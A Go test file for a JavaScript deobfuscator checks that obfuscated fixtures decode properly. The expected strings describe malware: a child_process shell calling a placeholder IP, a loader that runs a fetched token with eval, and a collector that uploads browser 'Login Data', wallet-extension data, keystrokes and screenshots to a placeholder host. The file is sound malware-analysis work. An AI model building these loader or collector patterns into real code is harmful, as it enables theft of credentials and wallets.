package jsdeob

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// The fixtures are real javascript-obfuscator 4.1.1 output (see
// scripts/gen-fixtures.sh), three presets per source file.
var fixtureWants = map[string][]string{
	"shell":     {"socket.io-client", "child_process", "203.0.113.47", "command", "message", "identify", "c7f2a1e09b"},
	"loader":    {"axios", "http://api.token-check.invalid:3000", "/api/service/token/", "x-secret-header"},
	"collector": {"http://198.51.100.88:1224/uploads", "nkbihfbeogaeaoehlefnkodbefgpgknn", "node-global-key-listener", "screenshot-desktop", "Login Data"},
}

func TestFixtures(t *testing.T) {
	files, err := filepath.Glob("../../testdata/js/*.obf.js")
	if err != nil || len(files) != 9 {
		t.Fatalf("expected 9 fixtures, got %d (%v)", len(files), err)
	}
	for _, f := range files {
		f := f
		name := filepath.Base(f)
		t.Run(name, func(t *testing.T) {
			src, err := os.ReadFile(f)
			if err != nil {
				t.Fatal(err)
			}
			res, err := Deobfuscate(string(src), Options{})
			if err != nil {
				t.Fatalf("deobfuscate: %v", err)
			}
			if res.Failed != 0 {
				t.Errorf("%d call sites failed to evaluate", res.Failed)
			}
			if res.Replaced == 0 {
				t.Errorf("no call sites replaced")
			}
			preset := strings.Split(name, ".")[1]
			wantEnc := map[string]string{"default": "none", "b64": "base64", "rc4": "rc4"}[preset]
			if res.Encoding != wantEnc {
				t.Errorf("encoding = %q, want %q", res.Encoding, wantEnc)
			}
			if !res.Rotated {
				t.Errorf("rotation IIFE not found")
			}
			if strings.Contains(res.Source, res.ArrayName) {
				t.Errorf("string array %s still referenced after cleanup", res.ArrayName)
			}
			if _, err := parse(res.Source); err != nil {
				t.Fatalf("output doesn't parse: %v", err)
			}
			all := strings.Join(res.Strings, "\n")
			for _, w := range fixtureWants[strings.Split(name, ".")[0]] {
				if !strings.Contains(all, w) {
					t.Errorf("missing string %q", w)
				}
			}
		})
	}
}

// The deobfuscated output should read like the original: decoder calls,
// proxy objects and split strings gone. Checked on the hardest preset.
func TestRC4LoaderReadsLikeSource(t *testing.T) {
	src, err := os.ReadFile("../../testdata/js/loader.rc4.obf.js")
	if err != nil {
		t.Fatal(err)
	}
	res, err := Deobfuscate(string(src), Options{})
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"require('axios')",
		"eval(",
		".response.data",
		"'x-secret-header':'secret'",
	} {
		if !strings.Contains(res.Source, want) {
			t.Errorf("output lacks %q:\n%s", want, res.Source)
		}
	}
}

func TestPlainScript(t *testing.T) {
	res, err := Deobfuscate(`const u = 'http://' + '203.0.113.9' + ':1224'; fetch(u + '/pdown');`, Options{})
	if !errors.Is(err, ErrNoStringArray) {
		t.Fatalf("err = %v, want ErrNoStringArray", err)
	}
	if !strings.Contains(res.Source, "'http://203.0.113.9:1224'") {
		t.Errorf("concatenation not folded: %s", res.Source)
	}
}

func TestBootstrapLoopIsInterrupted(t *testing.T) {
	// A hostile "string array" whose decoder never returns.
	src := `function A(){var a=['x','y','z','w'];A=function(){return a;};return A();}
function D(i){var a=A();while(true){}return a[i];}
(function(f,n){var a=f();a.push(a.shift());}(A,1));
console.log(D(0));`
	res, err := Deobfuscate(src, Options{Timeout: 50e6})
	if res == nil {
		t.Fatalf("nil result: %v", err)
	}
	if res.Replaced != 0 {
		t.Errorf("replaced %d calls from a decoder that never returns", res.Replaced)
	}
}

func TestQuoteRoundTrip(t *testing.T) {
	cases := []string{"", "plain", `it's`, `back\slash`, "line\nbreak\r\t", "\x00\x01\x7f", "日本語", "\u2028\u2029", "emoji 🦦"}
	for _, c := range cases {
		if _, err := parse("x = " + quote(c) + ";"); err != nil {
			t.Fatalf("quote(%q) = %s does not parse: %v", c, quote(c), err)
		}
		if c == "" {
			continue // collectStrings skips empty strings
		}
		got := collectStrings("x = " + quote(c) + ";")
		if len(got) != 1 || got[0] != c {
			t.Errorf("round trip of %q gave %q", c, got)
		}
	}
}

func TestSimplify(t *testing.T) {
	cases := map[string]string{
		`a['push'](b);`:        `a.push(b);`,
		`a?.['x'];`:            `a?.x;`,
		`x = !![]; y = ![];`:   `x = true; y = false;`,
		`p = 0x58a;`:           `p = 1418;`,
		`n = 0x10.toString();`: `n = (16).toString();`,
		`if ('ab' === 'ab') { go(); } else { stop(); }`: `{ go(); }`,
		`s = 'ht' + 'tp' + '://';`:                      `s = 'http://';`,
		`k = a['not-an-ident'];`:                        `k = a['not-an-ident'];`,
	}
	for in, want := range cases {
		got := cleanup(in, 8)
		if got != want {
			t.Errorf("cleanup(%q)\n got %q\nwant %q", in, got, want)
		}
	}
}

func TestProxyNotInlinedWhenObjectEscapes(t *testing.T) {
	src := `const o={'a':'x'};use(o);f(o.a);`
	if got := cleanup(src, 8); got != src {
		t.Errorf("proxy that escapes was rewritten: %s", got)
	}
}
